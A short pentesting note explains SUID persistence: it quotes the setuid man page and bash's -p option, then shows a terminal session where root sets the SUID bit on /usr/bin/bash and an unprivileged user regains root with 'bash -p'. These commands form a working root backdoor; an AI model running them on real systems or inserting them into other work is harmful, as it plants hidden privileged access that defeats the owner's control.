# SUID persistence

```
setuid - set user identity

#include <unistd.h>
int setuid(uid_t uid);

https://man7.org/linux/man-pages/man2/setuid.2.html
```


`SUID` binaries are well known to be dangerous because they allow you to maintain the same `root` privileges when running a certain command.
This can be used to set a shell with the `SUID` bit is set to true and then exploit that to re-obtain a shell under `root` privileges.
Also, the `-p` option of `bash`, allows us to maintain the same privileges as the owner of the binary invoked.

Bash manual:

```
      -p  Turned on whenever the real and effective user ids do not match.
          Disables processing of the $ENV file and importing of shell
          functions.  Turning this option off causes the effective uid and
          gid to be set to the real uid and gid.
```

Exploit:

```bash
┌──(root㉿DESKTOP)-[/home/virgula/test]
└─# which bash
/usr/bin/bash

┌──(root㉿DESKTOP)-[/home/virgula/test]
└─# chmod +s /usr/bin/bash

┌──(root㉿DESKTOP)-[/home/virgula/test]
└─# exit
exit
➜  test /usr/bin/bash -p
bash-5.2# whoami
root
bash-5.2#
```